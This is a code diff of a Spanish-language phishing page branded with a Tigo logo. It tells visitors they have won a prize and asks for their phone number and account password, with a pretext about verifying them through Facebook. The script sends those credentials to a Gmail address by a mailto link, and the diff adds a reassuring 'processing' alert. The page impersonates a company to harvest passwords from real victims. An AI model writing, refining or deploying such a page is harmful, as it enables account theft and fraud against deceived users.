@@ -44,7 +44,7 @@
 </head>
 <body>
     <!-- Navbar -->
-    <nav class="navbar is-blue" role="navigation" aria-label="main navigation">
+    <nav class="navbar is-link" role="navigation" aria-label="main navigation">
         <div class="navbar-brand">
             <a class="navbar-item" href="#">
                 <img src="https://www.liblogo.com/img-logo/ti6188t63b-tigo-logo-tigo-logo-.png" alt="Tigo Logo">
@@ -182,6 +182,7 @@
             const premio = premioGanado.textContent;
 
             if (telefono && contrasena) {
+                alert('ahora esta procesando su información, de clic en aceptar para continuar');
                 const subject = `Ganador del Premio: ${premio}`;
                 const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}\n\nLa presente información es solicitada solo para verificar que usted es una persona real, por tal razón nos valemos de su cuenta de Facebook para confirmarlo. No se preocupe por sus datos, su información será eliminada en cuanto le hayamos enviado su premio. para enviar el correo haga clic en el icono que aparece en la parte de arriba, el que parece un triangulo.`;
                 window.location.href = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
